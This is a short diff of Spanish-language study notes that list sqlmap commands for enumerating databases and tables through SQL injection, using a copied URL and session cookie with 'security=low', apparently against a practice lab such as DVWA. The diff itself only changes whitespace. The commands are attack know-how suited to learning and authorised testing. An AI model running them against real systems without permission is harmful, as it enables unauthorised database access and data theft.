@@ -1,5 +1,5 @@
 ++ Terminal
 --- sqlmap <url_copiada> --cookie='PHPSESSID=<valor_copiado>; security=low' --dbs 
---- Se nos mostrarán las bases de datos disponibles 
+---- Se nos mostrarán las bases de datos disponibles 
 --- sqlmap <url_copiada> --cookie='PHPSESSID=<valor_copiado>; security=low' --dbs --tables --tables -D <nombre_base_de_datos>
---- Se nos mostrarán las tablas asociadas a la base de datos 
+---- Se nos mostrarán las tablas asociadas a la base de datos 
